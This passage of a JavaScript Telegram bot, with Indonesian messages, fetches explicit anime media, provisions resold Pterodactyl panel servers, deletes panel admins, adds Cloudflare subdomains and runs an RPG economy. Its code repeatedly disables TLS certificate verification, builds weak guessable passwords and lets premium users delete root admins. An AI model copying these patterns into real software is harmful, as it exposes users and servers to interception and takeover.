    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/nsfwgif/, async (msg) => {
    const chatId = msg.chat.id;

    if (!isOwner(chatId) && !isPremium(chatId)) {
        bot.sendMessage(chatId, global.mess.ownerprem);
        return;
    }

    bot.sendMessage(chatId, global.mess.wait);

    // List API NSFW GIF
    const apis = [
        'https://nekobot.xyz/api/image?type=pgif', // Nekobot API
        'https://danbooru.donmai.us/posts.json?tags=rating:explicit+animated&limit=1' // Danbooru API
    ];

    // Pilih API secara random
    const api = apis[Math.floor(Math.random() * apis.length)];

    try {
        const agent = new https.Agent({ rejectUnauthorized: false });

        const response = await axios.get(api, { httpsAgent: agent });

        let gifUrl;
        if (api.includes('nekobot')) {
            gifUrl = response.data.success ? response.data.message : null;
        } else if (api.includes('danbooru')) {
            gifUrl = response.data.length > 0 ? response.data[0].file_url : null;
        }

        if (gifUrl) {
            bot.sendAnimation(chatId, gifUrl);
        } else {
            bot.sendMessage(chatId, '❌ GIF tidak ditemukan.');
        }
    } catch (error) {
        console.error("Error fetching NSFW GIF:", error.message);
        bot.sendMessage(chatId, '❌ Terjadi kesalahan, coba lagi nanti.');
    }
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/nsfwimg/, async (msg) => {
    const chatId = msg.chat.id;

    // Cek apakah pengguna adalah pemilik atau premium
    if (!isOwner(chatId) && !isPremium(chatId)) {
        bot.sendMessage(chatId, global.mess.ownerprem);
        return;
    }

    bot.sendMessage(chatId, global.mess.wait);

    // List API NSFW Image
    const apis = [
        'https://nekobot.xyz/api/image?type=png', // Nekobot API for NSFW Image (PNG)
        'https://api.donmai.us/posts.json?tags=rating:explicit+animated&limit=1' // Danbooru API for NSFW Image (PNG)
    ];

    // Pilih API secara random
    const api = apis[Math.floor(Math.random() * apis.length)];

    try {
        const response = await axios.get(api, {
            httpsAgent: new https.Agent({
                rejectUnauthorized: false // Bypass SSL verification for self-signed certificates
            })
        });

        let imageUrl;
        if (api.includes('nekobot')) {
            if (response.data.success && response.data.message) {
                imageUrl = response.data.message;
            }
        } else if (api.includes('danbooru')) {
            if (response.data.length > 0 && response.data[0].file_url) {
                imageUrl = response.data[0].file_url;
            }
        }

        if (imageUrl) {
            bot.sendPhoto(chatId, imageUrl);
        } else {
            bot.sendMessage(chatId, '❌ Gambar tidak ditemukan. Coba lagi nanti.');
        }
    } catch (error) {
        console.error(`Error fetching NSFW image: ${error.message}`);
        bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil gambar, coba lagi nanti.');
    }
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/(1|2|3|4|5|6|7|8|9|unli)gb (.+)/, async (msg, match) => { const chatId = msg.chat.id;

// Check if the user is either an owner or premium
if (!isOwner(chatId) && !isPremium(chatId)) {
    return bot.sendMessage(chatId, global.mess.ownerprem);
}

const ramInput = match[1];
const username = match[2].toLowerCase();
const email = `${username}@hanzzx.com`;
const name = capitalize(username) + ' Server';
const password = username + crypto.randomBytes(2).toString('hex');
const cpu = "2";
const disk = "10";
const loc = "1";

await bot.sendMessage(chatId, global.mess.wait);

let ram = ramInput === 'unli' ? 'unlimited' : parseInt(ramInput);
if (isNaN(ram) || (ram !== 'unlimited' && (ram < 1 || ram > 9))) {
    return bot.sendMessage(chatId, global.mess.invalidRam);
}

try {
    let response = await fetch(`${global.domain}/api/application/users`, {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${global.apikey}`,
        },
        body: JSON.stringify({ email, username, first_name: name, last_name: 'Server', language: 'en', password })
    });

    let data = await response.json();
    if (data.errors) {
        return bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
    }

    const userId = data.attributes.id;
    const desc = new Date().toISOString();

    let eggResponse = await fetch(`${global.domain}/api/application/nests/${global.nestid}/eggs/${global.egg}`, {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${global.apikey}`,
        },
    });

    let eggData = await eggResponse.json();
    const startupCmd = eggData.attributes.startup;

    let serverResponse = await fetch(`${global.domain}/api/application/servers`, {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${global.apikey}`,
        },
        body: JSON.stringify({
            name, description: desc, user: userId, egg: parseInt(global.egg),
            docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
            startup: startupCmd,
            environment: { INST: 'npm', USER_UPLOAD: '0', AUTO_UPDATE: '0', CMD_RUN: 'npm start' },
            limits: { memory: ram === 'unlimited' ? 9999 : ram, swap: 0, disk, io: 500, cpu },
            feature_limits: { databases: 5, backups: 5, allocations: 5 },
            deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
        })
    });

    let server = await serverResponse.json();
    if (server.errors) {
        return bot.sendMessage(chatId, `Error: ${JSON.stringify(server.errors[0], null, 2)}`);
    }

    const message = `
Kring-Kring Pakett, Ini Paket Data Panel Mu📦



◈ ID Server : ${server.id}
◈ Username : ${username}
◈ Password : ${password}
◈ Login : ${global.login}
◈ Ram : ${ram === "unlimited" ? "Unlimited" : ram + "GB"}
◈ Cpu : ${cpu == "0" ? "Unlimited" : cpu+"%"}
◈ Disk : ${disk == "0" ? "Unlimited" : disk + "GB"}
◈ Expired : 1 Month

Rules Pembelian:
◈ Simpan Data Ini, Reseller Hanya Memberikan Data 1x
◈ Jangan Share Domain Panel
◈ Garansi Aktif 10 Hari 1x replace
`;

bot.sendMessage(chatId, message);
    updateBotStats("command"); // Track penggunaan perintah
} catch (error) {
    bot.sendMessage(chatId, `Unexpected error: ${error.message}`);
}

});

function capitalize(str) { return str.charAt(0).toUpperCase() + str.slice(1); }

// List admin panel
bot.onText(/\/listadmin/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(chatId) && !isPremium(chatId)) {
  bot.sendMessage(chatId, global.mess.ownerprem);
  return;
  }
  
  bot.sendMessage(chatId, global.mess.wait);
  let res2 = await fetch(`${global.domain}/api/application/users?page=1`, {
    method: 'GET',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${global.apikey}`,
    },
  });

  let data = await res2.json();
  let users = data.data;
  if (users.length < 1) return bot.sendMessage(chatId, 'No admin panel found.');

  let messageText = "\n #- List Admin Panel\n";
  users.forEach((i) => {
    if (i.attributes.root_admin !== true) return;
    messageText += `\n ID : ${i.attributes.id}\n Name : ${i.attributes.first_name}\n Created : ${i.attributes.created_at.split("T")[0]}\n`;
  });

  bot.sendMessage(chatId, messageText);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/listpanel|\/listp|\/listserver/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(chatId) && !isPremium(chatId)) {
    return bot.sendMessage(chatId, global.mess.ownerprem);
  }
  
  bot.sendMessage(chatId, global.mess.wait);

  try {
    let res = await axios.get(`${global.domain}/api/application/servers?page=1`, {
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${global.apikey}`,
      },
    });

    let servers = res.data.data;
    if (servers.length < 1) return bot.sendMessage(chatId, '❌ No bot servers found.');

    let messageText = "\n #- List Server Panel\n";
    for (let server of servers) {
      let s = server.attributes;
      
      let f3 = await axios.get(`${global.domain}/api/client/servers/${s.uuid.split('-')[0]}/resources`, {
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${global.capikey}`,
        },
      });

      let data = f3.data;
      let status = data.attributes ? data.attributes.current_state : s.status;
      
      messageText += `\n🔹 ID: ${s.id}\n🔹 Name: ${s.name}\n🔹 RAM: ${s.limits.memory ? `${s.limits.memory} GB` : 'Unlimited'}\n🔹 CPU: ${s.limits.cpu ? `${s.limits.cpu}%` : 'Unlimited'}\n🔹 Disk: ${s.limits.disk ? `${s.limits.disk} GB` : 'Unlimited'}\n🔹 Created: ${s.created_at.split("T")[0]}\n🔹 Status: ${status}\n`;
    }

    bot.sendMessage(chatId, messageText);
    updateBotStats("command"); // Track penggunaan perintah

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data server.');
  }
});

// Delete admin
bot.onText(/\/deladmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(chatId) && !isPremium(chatId)) {
  bot.sendMessage(chatId, global.mess.ownerprem);
  return;
  }

  let userId = match[1];
  bot.sendMessage(chatId, global.mess.wait);

  let res2 = await fetch(`${global.domain}/api/application/users?page=1`, {
    method: 'GET',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${global.apikey}`,
    },
  });

  let data = await res2.json();
  let users = data.data;
  let admin = users.find((user) => user.attributes.id === userId && user.attributes.root_admin === true);
  if (!admin) return bot.sendMessage(chatId, 'Admin not found.');
  
  await fetch(`${global.domain}/api/application/users/${admin.attributes.id}`, {
    method: 'DELETE',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${global.apikey}`,
    },
  });

  bot.sendMessage(chatId, `Successfully removed admin: ${admin.attributes.first_name}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/tourl/, async (msg) => {
    try {
        if (!msg.reply_to_message || !msg.reply_to_message.photo) {
            return bot.sendMessage(msg.chat.id, '⚠️ Balas gambar dengan /tourl');
        }

        bot.sendMessage(msg.chat.id, global.mess.wait);

        let fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
        let file = await bot.getFile(fileId);
        let fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;

        let cachePath = './cache/tourl';
        if (!fs.existsSync(cachePath)) {
            fs.mkdirSync(cachePath, { recursive: true });
        }

        let imagePath = path.join(cachePath, path.basename(file.file_path));

        // 🔥 FIX: Gunakan axios buat download gambar
        let imageResponse = await axios({
            url: fileUrl,
            responseType: 'stream',
            httpsAgent: new https.Agent({ rejectUnauthorized: false }), // SSL Bypass
        });

        const writer = fs.createWriteStream(imagePath);
        imageResponse.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        // 🔥 FIX: Gunakan FormData bawaan `axios`
        let formData = new FormData();
        formData.append('file', fs.createReadStream(imagePath));

        let upload = await axios.post('http://www.hanzzstore.ct.ws/api/upload.php', formData, {
            headers: formData.getHeaders(),
            httpsAgent: new https.Agent({ rejectUnauthorized: false }), // SSL Bypass
        });

        console.log('Response from server:', upload.data); // Debug

        if (upload.data && upload.data.url) {
            bot.sendMessage(msg.chat.id, `🖼 Tourl 🖼\n🖥 Status: Success\n❌ Error: No Error\n📊 File Size: ${imageResponse.headers['content-length']} bytes\n🔗 URL: ${upload.data.url}`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(msg.chat.id, `🖼 Tourl 🖼\n🖥 Status: Failed\n❌ Error: ${JSON.stringify(upload.data)}\n📊 File Size: ${imageResponse.headers['content-length']} bytes`);
        }

        fs.unlinkSync(imagePath); // Hapus file setelah upload

    } catch (error) {
        console.error('Error in /tourl:', error);
        bot.sendMessage(msg.chat.id, `🖼 Tourl 🖼\n🖥 Status: Failed\n❌ Error: ${error.message}`);
    }
});

bot.onText(/\/subdo(?:main)? (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isOwner(chatId) && !isPremium(chatId)) {
    bot.sendMessage(chatId, global.mess.ownerprem);
    return;
    }
    
    console.log(match); // Debugging input

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `❌ Format salah! Contoh: /subdo 1 hostname|ipvps\n\nKetik /listsubdo untuk melihat daftar subdomain.`);
    }

    const text = match[1];

    if (!isOwner(chatId) && !isPremium(chatId)) {
        return bot.sendMessage(chatId, global.mess.ownerprem);
    }

    if (!text.includes(' ')) {
        return bot.sendMessage(chatId, `❌ Format salah! Contoh: /subdo 1 hostname|ipvps\n\nKetik /listsubdo untuk melihat daftar subdomain.`);
    }

    let [mode, data] = text.split(' ', 2);

    if (isNaN(mode) || !data || !data.includes('|')) {
        return bot.sendMessage(chatId, `❌ Format salah! Contoh: /subdo 1 hostname|ipvps`);
    }

    let [hostname, ipvps] = data.split('|');

    if (!hostname || !ipvps) {
        return bot.sendMessage(chatId, `❌ Hostname atau IP VPS tidak boleh kosong!`);
    }

    console.log(global.subdomain); // Debugging global.subdomain
    let subdomainList = Object.keys(global.subdomain);
    let selectedSubdomain = subdomainList[Number(mode) - 1];

    if (!selectedSubdomain) {
        return bot.sendMessage(chatId, `❌ Subdomain tidak ditemukan! Ketik /listsubdo untuk melihat daftar subdomain.`);
    }

    bot.sendMessage(chatId, global.mess.wait);

    let { zone, apiToken } = global.subdomain[selectedSubdomain];

    if (!zone || !apiToken) {
        return bot.sendMessage(chatId, `❌ Zone ID atau API Token tidak ditemukan!`);
    }

    let url = `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`;
    let headers = { "Authorization": `Bearer ${apiToken}`, "Content-Type": "application/json" };

    let body = {
        type: "A",
        name: `${hostname}.${selectedSubdomain}`,
        content: ipvps,
        ttl: 120,
        proxied: false
    };

    try {
        let res = await axios.post(url, body, { headers });

        console.log(res.data); // Debugging response Cloudflare

        if (res.data.success) {
            let doSubdo = `${hostname}.${selectedSubdomain}`;
            bot.sendMessage(chatId, `Subdomain Berhasil Dibuat! \n🔹 Hostname: ${hostname}\n🔹 IP VPS: ${ipvps}\n🔹 Domain: ${doSubdo}`);
    updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\n🔸 Error: ${res.data.errors.map(e => e.message).join(', ')}`);
        }
    } catch (err) {
        bot.sendMessage(chatId, `❌ Terjadi kesalahan! ${err.message}`);
    }
});
// Handle the 'listsubdo' command
bot.onText(/\/listsubdo/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(chatId) && !isPremium(chatId)) {
        return bot.sendMessage(chatId, global.mess.ownerprem);
    }

    bot.sendMessage(chatId, global.mess.wait);

    let subList = Object.keys(global.subdomain).map((sub, i) => `${i + 1}. ${sub}`).join('\n');
    let listMsg = `#- List Subdo HanzzX\n${subList ? subList : 'Belum ada subdomain yang terdaftar.'}`;

    bot.sendMessage(chatId, listMsg);
    updateBotStats("command"); // Track penggunaan perintah
});

// Handle 'namaninja' command
bot.onText(/\/ninja (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1] || msg.text;
    bot.sendMessage(chatId, global.mess.wait);

    const replacedText = text.replace(/[a-z]/gi, v => {
        return {
            'a': 'ka',
            'b': 'tu',
            'c': 'mi',
            'd': 'te',
            'e': 'ku',
            'f': 'lu',
            'g': 'ji',
            'h': 'ri',
            'i': 'ki',
            'j': 'zu',
            'k': 'me',
            'l': 'ta',
            'm': 'rin',
            'n': 'to',
            'o': 'mo',
            'p': 'no',
            'q': 'ke',
            'r': 'shi',
            's': 'ari',
            't': 'ci',
            'u': 'do',
            'v': 'ru',
            'w': 'mei',
            'x': 'na',
            'y': 'fu',
            'z': 'zi'
        }[v.toLowerCase()] || v;
    });

    bot.sendMessage(chatId, replacedText);
    updateBotStats("command"); // Track penggunaan perintah
});

// Handle 'tcn' or 'toenchant' command
bot.onText(/\/(tcn|toenchant) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[2];
    bot.sendMessage(chatId, global.mess.wait);

    try {
        const charMap = {
            a: "ᔑ",
            b: "ʖ",
            c: "ᓵ",
            d: "↸",
            e: "ᒷ",
            f: "⎓",
            g: "⊣",
            h: "⍑",
            i: "╎",
            j: "⋮",
            k: "ꖌ",
            l: "ꖎ",
            m: "ᒲ",
            n: "リ",
            o: "𝙹",
            p: "!¡",
            q: "ᑑ",
            r: "∷",
            s: "ᓭ",
            t: "ℸ ̣",
            u: "⚍",
            v: "⍊",
            w: "∴",
            x: "̇/",
            y: "||",
            z: "⨅"
        };

        if (!text) {
            return bot.sendMessage(chatId, "Harap masukkan teks/nama yang ingin convert!");
        }

        const convertToEnchant = (text) => {
            return new Promise((resolve) => {
                const result = text
                    .toLowerCase()
                    .split("")
                    .map((char) => charMap[char] || char)
                    .join("");
                resolve(result);
            });
        };

        const loli = await convertToEnchant(text);

        bot.sendMessage(chatId, `Input:\n${text}\n\nConvert:\n${loli}`, {
            parse_mode: 'Markdown'
        });
    updateBotStats("command"); // Track penggunaan perintah
    } catch (err) {
        bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${err}`);
    }
});

bot.onText(/\/setname (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isOwner(chatId)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    let newName = match[1].trim();
    
    if (!newName) {
        bot.sendMessage(chatId, "⚠️️ Gunakan format: `/setname Nama_Baru`");
        return;
    }

    bot.sendMessage(chatId, global.mess.wait);

    try {
        await bot.setMyName(newName);
        bot.sendMessage(chatId, `✅ Nama bot berhasil diubah menjadi ${newName}.`);
        updateBotStats("command"); // Track penggunaan perintah
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengubah nama bot.");
    }
});

bot.onText(/\/setpp/, async (msg) => {
    const chatId = msg.chat.id;

    if (!isOwner(chatId)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    if (!msg.reply_to_message || !msg.reply_to_message.photo) {
        bot.sendMessage(chatId, "⚠️️ Reply ke foto dengan perintah /setpp.");
        return;
    }

    bot.sendMessage(chatId, global.mess.wait);

    try {
        let fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
        let file = await bot.getFile(fileId);
        let fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

        // Set foto profil bot
        await bot.setMyProfilePhoto({ photo: fileUrl });

        bot.sendMessage(chatId, "✅ Foto profil bot berhasil diubah.");
        updateBotStats("command"); // Track penggunaan perintah
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengubah foto profil bot.");
    }
});

// 📌 Ping Command
bot.onText(/\/(ping|test)$/, async (msg) => {
    try {
        const start = Date.now(); // Waktu awal untuk menghitung kecepatan

        // Ambil data sistem
        const osInfo = await si.osInfo();
        const memory = await si.mem();
        const disk = await si.diskLayout();
        const cpu = await si.cpu();
        const network = await si.networkStats();

        // Hitung waktu respon (speed)
        const end = Date.now();
        const speed = end - start; // Kecepatan reply dalam milidetik

        // Format pesan
        let pingMessage = `pong🏓\n\n`;
        pingMessage += `OS: ${osInfo.distro} ${osInfo.release}\n`;
        pingMessage += `RAM: ${(memory.total / (1024 * 1024 * 1024)).toFixed(2)} GB\n`;
        pingMessage += `Disk: ${disk.map(d => `${d.name}: ${(d.size / (1024 * 1024 * 1024)).toFixed(2)} GB`).join(", ")}\n`;
        pingMessage += `Speed: ${speed} ms\n`; // Kecepatan bot reply dalam milidetik

        // Kirim pesan
        bot.sendMessage(msg.chat.id, pingMessage);
        updateBotStats("command"); // Track penggunaan perintah
    } catch (error) {
        console.error('Error:', error);
        bot.sendMessage(msg.chat.id, "⚠️ Terjadi kesalahan dalam mengambil data sistem.");
    }
});

// 📌 Transfer Saldo
bot.onText(/\/tfsaldo (\d+) (\d+)/, (msg, match) => {
    const senderId = msg.from.id;
    const receiverId = match[1];
    const amount = parseInt(match[2]);

    if (transferBalance(senderId, receiverId, amount)) {
        bot.sendMessage(msg.chat.id, `✅ Transfer ${amount} Gold ke ${receiverId} berhasil!`);
    updateBotStats("command"); // Track penggunaan perintah
    } else {
        bot.sendMessage(msg.chat.id, "❌ Gagal transfer! Cek saldo atau ID tujuan.");
    }
});

// 📌 Register Command
bot.onText(/\/register/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const users = loadDatabase();

    if (users[userId]) return bot.sendMessage(chatId, '✅ Kamu sudah terdaftar!');

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🛡️ Gunakan Captcha', callback_data: `register_captcha_${userId}` }],
                [{ text: '⚡ Otomatis', callback_data: `register_auto_${userId}` }]
            ]
        }
    };
    bot.sendMessage(chatId, '🔹 Pilih metode registrasi:', options);
});
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id.toString();
    const users = loadDatabase();
    const data = query.data.split('_');
    const method = data[1];

    if (users[userId]) return bot.answerCallbackQuery(query.id, { text: "✅ Kamu sudah terdaftar!", show_alert: true });

    if (method === 'captcha') {
        const captcha = generateCaptcha();
        users[userId] = { captchaAnswer: captcha.answer };
        saveDatabase(users);
        bot.sendPhoto(chatId, captcha.image, { caption: '🔐 Masukkan teks captcha:' });
    } else if (method === 'auto') {
        registerUser(userId);
        bot.sendMessage(chatId, '✅ Registrasi berhasil! Kamu mendapatkan starter pack!');
    updateBotStats("command"); // Track penggunaan perintah
    }

    bot.editMessageReplyMarkup({ reply_markup: { inline_keyboard: [] } }, { chat_id: chatId, message_id: query.message.message_id });
});
bot.on('message', (msg) => {
    const userId = msg.from.id.toString();
    const chatId = msg.chat.id;
    const users = loadDatabase();

    if (users[userId] && users[userId].captchaAnswer) {
        const userAnswer = msg.text.trim();

        if (userAnswer.toLowerCase() === users[userId].captchaAnswer.toLowerCase()) {
            registerUser(userId);
            delete users[userId].captchaAnswer;
            saveDatabase(users);
            bot.sendMessage(chatId, '✅ Registrasi berhasil! Kamu mendapatkan starter pack!');
    updateBotStats("command"); // Track penggunaan perintah
        } else {
            const captcha = generateCaptcha();
            users[userId].captchaAnswer = captcha.answer;
            saveDatabase(users);
            bot.sendPhoto(chatId, captcha.image, { caption: '❌ Jawaban salah! Coba lagi:' });
        }
    }
});

// 📌 RPG & Economy Commands
bot.onText(/\/ceksaldo/, (msg) => {
    const userId = msg.from.id;
    const balance = checkBalance(userId);
    if (balance !== null) {
        bot.sendMessage(msg.chat.id, `💰 Saldo kamu: ${balance}`);
    updateBotStats("command"); // Track penggunaan perintah
    } else {
        bot.sendMessage(msg.chat.id, "⚠️️ Kamu belum terdaftar! Gunakan /register");
    }
});

// 📌 Command Me dengan Informasi Bank
bot.onText(/^\/me$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const user = getUserData(userId);
    
    if (!user) {
        return bot.sendMessage(chatId, "⚠️ Kamu belum terdaftar! Ketik /register untuk daftar.");
    }

    // Cek status Owner & Premium
    const isUserOwner = isOwner(userId);
    const isUserPremium = isPremium(userId);

    // XP buat naik level berikutnya
    const nextLevelXp = user.level * 100;
    
    try {
        // Ambil foto profil user
        const ppUrl = await bot.getUserProfilePhotos(userId)
            .then(res => res.photos.length > 0 ? res.photos[0][0].file_id : null);

        let caption = `👤 *Profil Kamu*\n` +
                      `📝 Nama: *${user.nickname || msg.from.first_name}*\n` +
                      `👑 Status: *${isUserOwner ? "👑 Owner" : isUserPremium ? "💎 Premium" : "👤 User"}*\n` +
                      `🏅 Rank: *${user.rank}*\n` +
                      `⭐ Level: *${user.level}*\n` +
                      `⚡ XP: *${user.xp} / ${nextLevelXp} XP*\n` +
                      `🎰 Menang Gambling: *${user.gamblingWin || 0}x*\n` +
                      `💀 Kalah Gambling: *${user.gamblingLose || 0}x*\n\n` +
                      `💰 Saldo: *${user.balance || 0}*\n` +
                      `🏦 Saldo Bank: *${user.bank || 0}*`;

        // Kirim dengan atau tanpa foto profil
        if (ppUrl) {
            bot.sendPhoto(chatId, ppUrl, { caption, parse_mode: "Markdown" });
        } else {
            bot.sendMessage(chatId, caption, { parse_mode: "Markdown" });
        }

        updateBotStats("command"); // Track penggunaan perintah
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan, coba lagi nanti.");
    }
});

// 📌 Berlayar Command (Menambah Negara Baru)
bot.onText(/\/berlayar/, async (msg) => {
    const userId = msg.from.id;
    const user = getUserData(userId);

    if (!user) {
        return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");
    }

    const destinations = [
        "Indonesia", "Brazil", "Singapore", "Belanda", "Jepang", 
        "Inggris", "Australia", "Amerika", "Perancis", "India"
    ];

    const options = {
        reply_markup: {
            inline_keyboard: destinations.map(dest => [{ 
                text: dest, 
                callback_data: `sail_${dest}_${userId}` 
            }])
        }
    };

    bot.sendMessage(msg.chat.id, "Pilih tujuan berlayar:", options);
    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Callback Query for Berlayar
bot.on('callback_query', async (query) => {
    const [action, destination, userId] = query.data.split('_');
    const user = getUserData(userId);

    if (!user) {
        return bot.sendMessage(query.message.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");
    }

    if (action === 'sail') {
        const currentTime = Date.now();
        const lastTime = lastSailTime[userId] || 0;

        if (currentTime - lastTime < 60000) {
            const cooldownTime = 60 - Math.floor((currentTime - lastTime) / 1000);
            return bot.sendMessage(query.message.chat.id, `⏳ Tunggu ${cooldownTime} detik sebelum bisa berlayar lagi.`);
        }

        lastSailTime[userId] = currentTime;
        locations[userId] = destination; // Simpan lokasi terbaru

        // Menambahkan XP ke user
        const xpGained = addXP(userId);
        // Mengurangi durability alat
        applyDamageToTools(userId);
        // Menambahkan item random
        const itemGained = giveRandomItem(userId);

        bot.sendMessage(query.message.chat.id, `🚢 Kamu berhasil berlayar ke ${destination} dan mendapatkan ${xpGained} XP! Item yang kamu dapat: ${itemGained}`);
    }
});

// 📌 Perintah Inventory (Cek Inventory)
bot.onText(/\/inventory/, (msg) => {
    const userId = msg.from.id;
    const user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus terdaftar terlebih dahulu. Gunakan perintah /register untuk registrasi.");

    if (Object.keys(user.inventory).length === 0) {
        return bot.sendMessage(msg.chat.id, "🔍 Inventory kamu kosong!");
    }

    let inventoryList = "🎒 Inventory Kamu:\n";
    for (const item in user.inventory) {
        inventoryList += `${user.inventory[item].name} x${user.inventory[item].quantity}\n`;  // Fixed line
    }

    bot.sendMessage(msg.chat.id, inventoryList);
    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Buy (Beli Item)
bot.onText(/\/buy (\w+|\ball\b)\s*(\d+)?/, (msg, match) => {
    const userId = msg.from.id;
    const itemName = match[1].toLowerCase();
    const amount = match[2] ? parseInt(match[2]) : 1;
    const user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus daftar dulu pakai /register.");

    if (itemName === "all") {
        // Beli semua item yang ada
        let boughtItems = [];
        for (let item in items) {
            const itemPrice = items[item].price * amount;
            if (user.balance >= itemPrice) {
                user.balance -= itemPrice;
                user.inventory[item] = user.inventory[item] || { name: items[item].name, quantity: 0 };
                user.inventory[item].quantity += amount;
                boughtItems.push(`${amount}x ${items[item].name}`);
            }
        }
        if (boughtItems.length > 0) {
            saveUsers();
            bot.sendMessage(msg.chat.id, `✅ Kamu berhasil membeli: ${boughtItems.join(", ")}!`);
        } else {
            bot.sendMessage(msg.chat.id, "⚠️️ Balance tidak cukup untuk membeli item.");
        }
    } else {
        if (!items[itemName]) return bot.sendMessage(msg.chat.id, "⚠️️ Item tidak ditemukan.");
        if (amount < 1) return bot.sendMessage(msg.chat.id, "⚠️️ Jumlah harus minimal 1.");
    
        const itemPrice = items[itemName].price * amount;
        if (user.balance < itemPrice) {
            return bot.sendMessage(msg.chat.id, `⚠️️ Balance tidak cukup. Kamu butuh ${itemPrice} balance.`);
        }
    
        user.balance -= itemPrice;
        user.inventory[itemName] = user.inventory[itemName] || { name: items[itemName].name, quantity: 0 };
        user.inventory[itemName].quantity += amount;
    
        saveUsers();
        bot.sendMessage(msg.chat.id, `✅ Kamu berhasil membeli ${amount}x ${items[itemName].name}!`);
    }

    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Sell (Jual Item)
bot.onText(/\/sell (\w+|\ball\b)\s*(\d+)?/, (msg, match) => {
    const userId = msg.from.id;
    const itemName = match[1].toLowerCase();
    const amount = match[2] ? parseInt(match[2]) : 1;
    const user = getUserData(userId);

    if (!user) return bot.sendMessage(msg.chat.id, "⚠️️ Kamu harus daftar dulu pakai /register.");

    if (itemName === "all") {
        // Jual semua item yang ada di inventory
        let soldItems = [];
        for (let item in user.inventory) {
            const itemPrice = items[item].price * user.inventory[item].quantity;
            user.balance += itemPrice;
            soldItems.push(`${user.inventory[item].quantity}x ${items[item].name}`);
            delete user.inventory[item];
        }
        if (soldItems.length > 0) {
            saveUsers();
            bot.sendMessage(msg.chat.id, `✅ Kamu berhasil menjual semua item: ${soldItems.join(", ")}! Balance sekarang: ${user.balance}`);
        } else {
            bot.sendMessage(msg.chat.id, "⚠️️ Tidak ada item untuk dijual.");
        }
    } else {
        if (!user.inventory[itemName]) return bot.sendMessage(msg.chat.id, `⚠️️ Kamu tidak punya ${itemName}.`);
        if (amount < 1) return bot.sendMessage(msg.chat.id, "⚠️️ Jumlah harus minimal 1.");

        const item = user.inventory[itemName];
        const itemPrice = items[itemName].price * amount;

        if (item.quantity < amount) {
            return bot.sendMessage(msg.chat.id, `⚠️️ Kamu hanya punya ${item.quantity}x ${itemName}.`);
        }

        item.quantity -= amount;
        user.balance += itemPrice;

        if (item.quantity === 0) delete user.inventory[itemName];

        saveUsers();
        bot.sendMessage(msg.chat.id, `✅ Kamu berhasil menjual ${amount}x ${items[itemName].name}! Balance sekarang: ${user.balance}`);
    }

    updateBotStats("command"); // Track penggunaan perintah
});

// 📌 Perintah Craft (Buat Item)
bot.onText(/\/craft (\w+|\ball\b)\s*(\d+)?/, (msg, match) => {
    const userId = msg.from.id;
